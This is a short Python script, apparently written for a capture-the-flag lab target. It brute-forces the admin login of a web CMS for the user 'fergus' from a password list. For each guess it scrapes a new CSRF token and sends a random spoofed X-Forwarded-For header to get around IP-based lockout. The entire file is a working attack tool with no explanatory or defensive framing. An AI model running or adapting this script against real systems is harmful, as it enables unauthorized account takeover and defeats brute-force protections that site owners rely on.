#!/usr/bin/python3

import sys,signal,requests,re,time,random
from pwn import *


def def_handler(sig, frame):
	print("Saliendo")
	sys.exit(0)


signal.signal(signal.SIGINT, def_handler)


URL="http://10.10.10.191/admin/login"
USER='fergus'

def requestweb():
	s = requests.session()
	cont=1
	f = open("password", "r")
	p1 = log.progress("Brute force")
	p1.status("Starting Brute forcing")
	time.sleep(2)
	for passwd in f.readlines():
		headers = { "X-Forwarded-For" : f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}" }
		passwd = passwd.strip('\n')
		p1.status("[%s/345] Trying password : %s "%(cont,passwd))
		r_get = s.get(URL)
		token = re.findall(r'name="tokenCSRF" value="(.*?)"', r_get.text)[0]
		send_data = {
				  	'tokenCSRF' : token,
 	              	'username'  : USER,
 	              	'password'  : '%s'%passwd,
 	              	'save'      : '' }
		r_post = s.post(URL,data=send_data,headers=headers)
		if "Username or password incorrect" not in r_post.text:
			p1.success("Password found: %s"%(passwd))
			break
		cont+=1
if __name__  == '__main__':
	requestweb()


